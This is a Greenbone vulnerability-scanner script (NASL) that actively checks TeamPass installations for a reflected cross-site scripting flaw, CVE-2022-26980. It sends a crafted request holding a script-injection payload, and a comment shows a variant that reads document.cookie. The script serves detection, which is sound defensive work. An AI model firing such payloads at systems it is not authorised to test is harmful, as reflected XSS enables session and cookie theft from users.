# Copyright (C) 2023 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:teampass:teampass";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.170365");
  script_version("2023-03-23T10:09:49+0000");
  script_tag(name:"last_modification", value:"2023-03-23 10:09:49 +0000 (Thu, 23 Mar 2023)");
  script_tag(name:"creation_date", value:"2023-03-16 16:33:49 +0000 (Thu, 16 Mar 2023)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2022-04-04 17:15:00 +0000 (Mon, 04 Apr 2022)");

  script_cve_id("CVE-2022-26980");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TeamPass <= 2.1.26 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2023 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_teampass_http_detect.nasl");
  script_mandatory_keys("teampass/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"TeamPass is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Reflected XSS via the index.php PATH_INFO.");

  script_tag(name:"affected", value:"TeamPass version 2.1.26 and probably prior.");

  script_tag(name:"solution", value:"Update to version 3.0 or later.");

  script_xref(name:"URL", value:"https://gist.github.com/RNPG/6919286e0daebce7634d0a744e060dca/revisions");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/?')" + '"/><script>alert(' + "'vulntest'" + ")</script>";

# eg. <input type="password" size="10" id="pw" name="pw" onkeypress="if (event.keyCode == 13) launchIdentify('', '?')"/><script>alert(document.cookie)</script>', '')" class="input_text text ui-widget-content ui-corner-all" />
if (http_vuln_check(port:port, url:url, icase: FALSE, check_header: TRUE, pattern: "/><script>alert\('vulntest'\)</script>")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
